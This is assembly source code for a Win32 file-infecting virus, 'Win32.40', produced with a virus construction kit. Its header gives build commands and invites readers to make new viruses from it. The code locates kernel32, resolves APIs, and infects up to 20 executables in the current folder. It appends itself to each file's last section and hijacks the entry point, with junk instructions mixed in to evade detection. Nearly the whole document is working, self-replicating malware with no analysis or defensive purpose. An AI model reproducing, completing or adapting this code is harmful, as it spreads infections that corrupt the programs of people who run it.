              
;
;
; Win32.40 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.40
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 40
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 21
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ecx
                                        ; mov ebp, ecx
 mov ebp, ecx
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], esi
 inc eax                                ; Trash

                                        ; mov edi, -1
 push -1d
 pop edi
 and edi, dword ptr [ebp+Trash1]

 shr eax, 25d                           ; Trash
 mov dword ptr [ebp+Trash2], 0
 xor dword ptr [ebp+Trash2], edi

                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ebx
 push ebx
                                        ; round to pages
 shr ebx, 16d
 rol ebx, 16d
                                        ; add ebx, 1
 sub ebx, -1d
GetKernelLoop:
                                        ; clear edx
 and edx, 0
 sub ebx, 1
 mov dx, word ptr [ebx+03ch]
 test dx,0f800h
 jnz GetKernelLoop
 cmp ebx, dword ptr [ebx+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], ebx
 mov ecx, ebx
 add ecx, [ebx+3Ch]
 mov [KernelPE+ebp], ecx

 lea edi, [ebp+GetApis]
 xchg edi, eax

 push eax
ret

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 push 0
 pop edx
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea eax, [ebp+filemask]
 xchg eax, edi

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 inc dword ptr [ebp+Trash1]             ; Trash
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edx
 inc ebx                                ; Trash
                                        ; retrieve PE - Header
 mov ebx, [edx+3Ch]
 add ebx, edx
                                        ; get File Alignment
                                        ; add ebx, 60
 add ebx, 60d
 mov edx, [ebx]
 inc ebx
 sub ebx, 61d
                                        ; mov eax, -1
 mov eax, ( -1d xor 33d )
 xor eax, 33d
 and eax, dword ptr [ebp+WFD_nFileSizeLow]
 adc ebx, edx                           ; Trash
                                        ; calculate new size
 add eax, VirusSize
 push eax
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 add ebx, -1
 imul ebx, ebx, 28h
 add edx, ebx
                                        ; add edx, 120
 add edx, 120d
 mov eax, dword ptr [esi+74h]
 shl eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], eax
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], ebx
 mov ecx, [edx+10h]
                                        ; mov ebx, ecx
 push ecx
 pop ebx
 add ecx, [edx+14h]
 push ecx
 mov eax, ebx
 add edx, 0Ch
 add eax, [edx]
 sub edx, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 xor eax, eax

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], eax
 pop eax
 add eax,  (VirusSize-826d)
 add eax, 826d
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+0Ch]
 add eax, dword ptr [edx+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '40'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov ebx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+InfCounter]
 sub ecx, 1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 push eax
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 sub ebx, edx                           ; Trash
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, ecx

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
                                        ; clear edx
 push 0
 pop edx
 push ecx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], -1
 and dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad

 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ecx, [esi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get OTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
                                        ; clear edx
 mov edx, -34558d
 add edx, 34558d
 xor edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ecx]
                                        ; mov ecx, edx
 push edx
 pop ecx
                                        ; mov eax, ecx
 mov eax, ecx
 push eax
 push edi
 cld

                                        ; eax Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [edi]
 LoopChsksm:
                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [eax]
                                        ; add eax, 1
 add eax, 1d
 clc 
 sal bx,8d
 sub edx, ebx
 cmp bx, 0
 je LoopConti
                                        ; clear ebx
 sub ebx, ebx
 mov bl, byte ptr [eax]
                                        ; add eax, 1
 add eax, 1d
 sub edx, ebx
 test bx, bx
 jnz LoopChsksm
LoopConti:
 or edx, edx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop eax
 pop ecx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
 shr edx, 17d                           ; Trash
                                        ; clear Stack
 add esp, 4h
 pop eax
 pop eax
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop ecx
 movzx eax, word ptr [ecx]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov edi, ebp
 add edi, offset WFD_szFileName

                                        ; mov ebx, 276
 mov ebx, 0
 add ebx, 276d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ebx, ebp
 add ebx, offset WFD_szFileName

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edx, [ebp+WFD_szFileName]
 xchg eax, edx


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 lea eax, [ebp+WFD_nFileSizeLow]
 xchg ecx, eax

 cmp dword ptr [ecx], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov eax, -1
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 and edx, 0
 mov dx, word ptr [eax+3Ch]
                                        ; add edx, 1
 inc edx
 dec edx
 jz Notagoodfile
                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [eax+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 rcl ecx, 27d                           ; Trash
 add edx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ecx, 4612
 mov ecx, 4612d
 cmp ecx, 4612d
 add ebx, 906510d                       ; Trash
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '40'
 jnz yNotagoodfile
 jmp Notagoodfile
 inc ecx                                ; Trash
yNotagoodfile:
                                        ; check for DLL
 mov bx, word ptr [edx+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+Attributes]
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ebx
 inc dword ptr [ebp+Trash1]             ; Trash

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 sub dword ptr [ebp+Trash1], ebx        ; Trash

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 db 'Win32.40 - SnakeByte',0
 Attributes  dd 0h
 NewSize     dd 0h
 FindHandle  dd 0h
 Trash1      dd 0h
 OldBase     dd 400000h
 Trash3      dd 0h
 OldEIP      dd 0h
 AlignReg2   dd 0h
 Trash2      dd 0h
 MapAddress  dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APINames:
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'

 MapHandle   dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 AlignReg1   dd 0h
 NewEIP      dd 0h
 filemask    db '*.exe',0
 FileHandle  dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XGetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XSetFileAttributesA    dd 0h

 OTableVA    dd 0h
 KernelMZ    dd 0h
 NTableVA    dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov edx, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xchg edi, ecx

 mov ebx, offset APIOffsets
 and eax, ecx                           ; Trash
 add ebx, ebp
 shr eax, 5d                            ; Trash


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; ebx points to the offset

 call SearchAPI1
                                        ; add edi, 4
 add edi, 4d
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], 0
 add dword ptr [ebx], eax
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 dec edx
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg esi, ecx

 push esi
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

